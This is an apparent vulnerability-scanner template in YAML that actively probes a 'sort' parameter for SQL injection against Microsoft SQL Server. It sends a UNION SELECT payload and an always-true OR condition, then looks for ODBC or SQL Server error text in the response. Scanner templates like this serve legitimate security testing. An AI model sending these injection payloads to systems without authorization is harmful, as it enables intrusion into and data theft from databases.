id: sqli3-mssql-07
name: 'SQLi mssql prefix #6 in sort'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via sort'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sort:
        - ''') UNION SELECT 1,2--'
        - '''))) OR (((''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
